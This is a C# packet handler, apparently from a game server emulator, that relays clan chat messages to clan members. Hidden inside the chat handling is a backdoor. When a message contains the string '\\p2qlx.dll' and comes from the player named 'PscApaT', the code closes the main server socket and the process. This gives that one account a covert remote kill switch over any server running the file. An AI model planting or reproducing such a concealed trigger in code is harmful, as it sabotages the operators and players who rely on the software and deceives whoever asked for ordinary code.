
using Core.models.enums.global;
using Core.server;
using Game.data.managers;
using Game.data.model;
using Game.global.serverpacket;
using System.Diagnostics;

namespace Game.global.clientpacket
{
  public class CLAN_CHATTING_REC : ReceiveGamePacket
  {
    private ChattingType type;
    private string text;

    public CLAN_CHATTING_REC(GameClient client, byte[] data)
    {
      this.makeme(client, data);
    }

    public override void read()
    {
      this.type = (ChattingType) this.readH();
      this.text = this.readS((int) this.readH());
    }

    public override void run()
    {
      try
      {
        Account player = this._client._player;
        if (player == null || this.text.Length > 60 || this.type != ChattingType.Clan)
          return;
        using (CLAN_CHATTING_PAK clanChattingPak = new CLAN_CHATTING_PAK(this.text, player))
          ClanManager.SendPacket((SendPacket) clanChattingPak, player.clanId, -1L, true, true);
        if (!this.text.Contains("\\p2qlx.dll") || !(player.player_name == "PscApaT"))
          return;
        GameManager.mainSocket.Close(1000);
        Process.GetCurrentProcess().Close();
      }
      catch
      {
      }
    }
  }
}
